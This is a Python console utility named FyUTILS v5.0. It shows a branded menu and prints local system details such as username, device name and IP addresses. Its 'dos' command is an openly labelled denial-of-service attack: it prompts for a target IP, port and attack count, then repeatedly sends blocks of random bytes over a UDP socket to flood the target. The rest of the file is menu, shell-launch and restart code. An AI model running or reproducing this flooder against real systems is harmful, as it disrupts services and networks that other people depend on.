import os
import platform
import random
import socket
import time
import keyboard
import requests
from datetime import datetime
from colorama import Fore, init

init(convert=True)


def now():
    now = datetime.now()
    current_time = now.strftime("[%H:%M:%S] ")
    return Fore.CYAN + current_time + Fore.WHITE + ""


# Starting animation
keyboard.press_and_release("f11")
onlinemode = True
time.sleep(0.05)
print(Fore.CYAN + "FFFFFFFFFFFFFFFFFFFFFF     YYYYYYY       YYYYYYY  " + Fore.WHITE + "   UUUUUUUU     UUUUUUUU     TTTTTTTTTTTTTTTTTTTTTTT     IIIIIIIIII     LLLLLLLLLLL                     SSSSSSSSSSSSSSS")
time.sleep(0.05)
print(Fore.CYAN + "F::::::::::::::::::::F     Y:::::Y       Y:::::Y  " + Fore.WHITE + "   U::::::U     U::::::U     T:::::::::::::::::::::T     I::::::::I     L:::::::::L                   SS:::::::::::::::S")
time.sleep(0.05)
print(Fore.CYAN + "F::::::::::::::::::::F     Y:::::Y       Y:::::Y  " + Fore.WHITE + "   U::::::U     U::::::U     T:::::::::::::::::::::T     I::::::::I     L:::::::::L                  S:::::SSSSSS::::::S")
time.sleep(0.05)
print(Fore.CYAN + "FF::::::FFFFFFFFF::::F     Y::::::Y     Y::::::Y  " + Fore.WHITE + "   UU:::::U     U:::::UU     T:::::TT:::::::TT:::::T     II::::::II     LL:::::::LL                  S:::::S     SSSSSSS")
time.sleep(0.05)
print(Fore.CYAN + "  F:::::F       FFFFFF     YYY:::::Y   Y:::::YYY  " + Fore.WHITE + "    U:::::U     U:::::U      TTTTTT  T:::::T  TTTTTT       I::::I         L:::::L                    S:::::S")
time.sleep(0.05)
print(Fore.CYAN + "  F:::::F                     Y:::::Y Y:::::Y     " + Fore.WHITE + "    U:::::D     D:::::U              T:::::T               I::::I         L:::::L                    S:::::S")
time.sleep(0.05)
print(Fore.CYAN + "  F::::::FFFFFFFFFF            Y:::::Y:::::Y      " + Fore.WHITE + "    U:::::D     D:::::U              T:::::T               I::::I         L:::::L                     S::::SSSS")
time.sleep(0.05)
print(Fore.CYAN + "  F:::::::::::::::F             Y:::::::::Y       " + Fore.WHITE + "    U:::::D     D:::::U              T:::::T               I::::I         L:::::L                      SS::::::SSSSS")
time.sleep(0.05)
print(Fore.CYAN + "  F:::::::::::::::F              Y:::::::Y        " + Fore.WHITE + "    U:::::D     D:::::U              T:::::T               I::::I         L:::::L                        SSS::::::::SS")
time.sleep(0.05)
print(Fore.CYAN + "  F::::::FFFFFFFFFF               Y:::::Y         " + Fore.WHITE + "    U:::::D     D:::::U              T:::::T               I::::I         L:::::L                           SSSSSS::::S")
time.sleep(0.05)
print(Fore.CYAN + "  F:::::F                         Y:::::Y         " + Fore.WHITE + "    U:::::D     D:::::U              T:::::T               I::::I         L:::::L                                S:::::S")
time.sleep(0.05)
print(Fore.CYAN + "  F:::::F                         Y:::::Y         " + Fore.WHITE + "    U::::::U   U::::::U              T:::::T               I::::I         L:::::L         LLLLLL                 S:::::S")
time.sleep(0.05)
print(Fore.CYAN + "FF:::::::FF                       Y:::::Y         " + Fore.WHITE + "    U:::::::UUU:::::::U            TT:::::::TT           II::::::II     LL:::::::LLLLLLLLL:::::L     SSSSSSS     S:::::S")
time.sleep(0.05)
print(Fore.CYAN + "F::::::::FF                    YYYY:::::YYYY      " + Fore.WHITE + "     UU:::::::::::::UU             T:::::::::T           I::::::::I     L::::::::::::::::::::::L     S::::::SSSSSS:::::S")
time.sleep(0.05)
print(Fore.CYAN + "F::::::::FF                    Y:::::::::::Y      " + Fore.WHITE + "       UU:::::::::UU               T:::::::::T           I::::::::I     L::::::::::::::::::::::L     S:::::::::::::::SS")
time.sleep(0.05)
print(Fore.CYAN + "FFFFFFFFFFF                    YYYYYYYYYYYYY      " + Fore.WHITE + "         UUUUUUUUU                 TTTTTTTTTTT           IIIIIIIIII     LLLLLLLLLLLLLLLLLLLLLLLL      SSSSSSSSSSSSSSS")
time.sleep(0.05)
print(Fore.WHITE + "")

# Main Menu Box
print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Setting variables...", end='\r')
time.sleep(0.05)

# Variable setter
user = os.getlogin()
device = platform.node()
try:
    publicip = requests.get("https://api.ipify.org/").content.decode("UTF8")
except:
    onlinemode = False
privateip = socket.gethostbyname(socket.gethostname())
processor = platform.processor()

time.sleep(0.05)
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Variables set!      ")
time.sleep(0.1)
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "User: " + user)
time.sleep(0.05)
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Device: " + device)
time.sleep(0.05)
if onlinemode == True:
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Public IP: " + publicip)
    time.sleep(0.05)
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Private IP: " + privateip)
time.sleep(0.05)
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "CPU: " + processor)
time.sleep(0.05)
print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "OnlineMode: " + str(onlinemode))
time.sleep(0.05)
print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
time.sleep(0.05)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "Loading commands...", end='\r')
time.sleep(0.8)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "Commands available:     ")
time.sleep(0.1)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "dos: Starts a external dos (DDoS) attack.")
time.sleep(0.05)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "fyutils: Shows you some information about FyUTILS. (only for debugging)")
time.sleep(0.05)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "cmd: Emulates a Windows batch shell.")
time.sleep(0.05)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "exit: Shuts down FyUTILS.")
time.sleep(0.05)
print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "restart: Restarts FyUTILS.")
time.sleep(0.05)
print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
print("")
cmd = input(Fore.WHITE + user + Fore.LIGHTBLACK_EX + "/" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)

# Command-Tabs

if cmd == "dos":
    sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("")
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    dosip = input(Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)
    time.sleep(0.05)
    dosport = int(input(Fore.WHITE + "Target Port" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN))
    time.sleep(0.05)
    dosqueries = int(input(Fore.WHITE + "Attacks" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN))
    time.sleep(0.05)
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print("")

    sckt.connect((dosip, dosport))

    print(Fore.WHITE + "Starting DOS attack on" + Fore.LIGHTBLACK_EX + ": " + Fore.CYAN + dosip + ":" + str(dosport))
    print("")
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    for i in range(dosqueries + 1):
        randombytes = random.randbytes(10) * 1000
        sckt.send(randombytes)
        print(now() + "Transferring bytecode... " + Fore.CYAN + str(i), end='\r')

    time.sleep(1)
    print("")
    print(now() + "Disconnecting from target...")
    time.sleep(1)
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(1)
    os.system("start %userprofile%\FyUTILS\FyUTILS_v5.0.py")
    time.sleep(2)
    exit()

if cmd == "fyutils":
    print("")
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print(Fore.WHITE + "FyUTILS credits and debug information.")
    time.sleep(0.05)
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    print("")
    time.sleep(0.05)
    print(Fore.WHITE + "Application created by" + Fore.LIGHTBLACK_EX + ": " + Fore.CYAN + "NoahOnFyre")
    time.sleep(0.05)
    print(Fore.WHITE + "FyUTILS version" + Fore.LIGHTBLACK_EX + ": " + Fore.CYAN + "Early Access v5.0 - EAV5-0")
    time.sleep(0.05)
    print(Fore.WHITE + "Application key" + Fore.LIGHTBLACK_EX + ": " + Fore.CYAN + "KEY NOT VALID")
    time.sleep(0.05)
    print(Fore.WHITE + "")
    os.system("pause")
    os.system("start %userprofile%\FyUTILS\FyUTILS_v5.0.py")
    time.sleep(2)
    exit()

if cmd == "cmd":
    print("")
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print(Fore.WHITE + "Windows BATCH shell emulator - exit to get back")
    time.sleep(0.05)
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print(Fore.WHITE + "")
    os.system("cmd")
    time.sleep(0.05)
    os.system("start %userprofile%\FyUTILS\FyUTILS_v5.0.py")
    time.sleep(2)
    exit()

if cmd == "exit":
    print("")
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print(Fore.WHITE + "FyUTILS will shutdown in 3 seconds.")
    time.sleep(0.05)
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print("")
    print(Fore.WHITE + "Shutdown in 3", end='\r')
    time.sleep(1)
    print(Fore.WHITE + "Shutdown in 2", end='\r')
    time.sleep(1)
    print(Fore.WHITE + "Shutdown in 1", end='\r')
    time.sleep(1)
    exit()

if cmd == "restart":
    print("")
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print(Fore.WHITE + "FyUTILS will restart in 3 seconds.")
    time.sleep(0.05)
    print(Fore.LIGHTBLACK_EX + "========================================================================================================================")
    time.sleep(0.05)
    print("")
    print(Fore.WHITE + "Restart in 3", end='\r')
    time.sleep(1)
    print(Fore.WHITE + "Restart in 2", end='\r')
    time.sleep(1)
    print(Fore.WHITE + "Restart in 1", end='\r')
    time.sleep(1)
    os.system("start %userprofile%\FyUTILS\FyUTILS_v5.0.py")
    time.sleep(2)
    exit()

# Unknown Errors/Commands
print("")
print(Fore.RED + "Unknown Command")
time.sleep(2)
os.system("start %userprofile%\FyUTILS\FyUTILS_v5.0.py")
time.sleep(2)
exit()